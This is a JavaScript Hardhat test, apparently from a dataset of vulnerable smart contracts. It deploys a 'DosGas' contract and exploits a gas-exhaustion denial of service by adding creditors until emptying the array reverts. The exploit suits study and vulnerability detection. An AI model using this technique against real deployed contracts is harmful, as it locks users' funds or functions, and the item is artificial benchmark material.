const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack denial_of_service/dos_address.sol", function () {
  async function deployContracts() {
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/denial_of_service/dos_address.sol/DosGas.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const DosGas = await ethers.getContractFactory(json.abi, json.bytecode);
    const victim = await DosGas.deploy();
    await victim.waitForDeployment();

    return { victim };
  }

  it("sanity check: denial_of_service/dos_address.sol", async function () {
    const { victim } = await loadFixture(deployContracts);
    expect(await victim.iWin()).to.be.false;
  });

  it("exploit denial of service vulnerability", async function () {
    const { victim } = await loadFixture(deployContracts);

    // add enough creditors to make the contract run out of gas when emptying the creditors array
    for (let i = 0; i < 17; i++) {
      await victim.addCreditors();
    }

    await expect(victim.emptyCreditors()).to.be.reverted;

    // win never gets to be true
    expect(await victim.iWin()).to.be.false;
  });
});
